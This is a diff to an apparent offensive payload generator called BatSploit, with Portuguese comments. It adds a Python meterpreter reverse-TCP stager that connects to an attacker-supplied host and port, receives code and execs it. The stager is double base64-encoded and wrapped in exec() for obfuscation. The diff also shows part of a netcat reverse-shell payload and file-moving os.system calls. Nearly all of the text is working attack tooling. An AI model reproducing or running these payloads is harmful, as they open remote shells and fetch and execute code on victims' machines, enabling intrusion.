@@ -122,7 +122,7 @@ class BatSploit(object):
 		sys.stdout.write(colored(" Creating Payload : %s "%(payload), "white"))
 		sys.stdout.write(colored("======\n", "green"))
 		if payload == 'python/netcat_reverse_tcp':
-			# código do payload
+			# code ...
 			code = "import socket,os\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
 			code += "s.connect(('%s', %i))\n"%(host, port)
@@ -232,6 +232,32 @@ class BatSploit(object):
 			code += "?>"
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(code) # escreve o código no arquivo
+			payload_file.close() # fecha o arquivo
+			size_payload = os.path.getsize(name) # tamanho do payload
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			if self.platform == "Windows":
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+			elif self.platform == "Linux":
+				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+		elif payload == 'python/meterpreter_reverse_tcp':
+			code = "import socket,struct\n"
+			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+			code += "s.connect(('%s', %i))\n"%(host, port)
+			code += "l=struct.unpack('>I',s.recv(4))[0]\n"
+			code += "while s.recv(l)<l:\n"
+			code += "	s.recv(l-len(s.recv(l)))\n"
+			code += "exec(s.recv(l),{'s':s})"
+			encode = code.encode('base64').encode('base64').replace("\n", "") # isso codifica o código
+			payload_coded = "exec('%s'.decode('base64').decode('base64'))"%(encode) # isso decodifica e executa o payload
+			payload_file = open(name, 'w') # abri o arquivo dst
+			payload_file.write(payload_coded) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("\n[+] ", "green"))
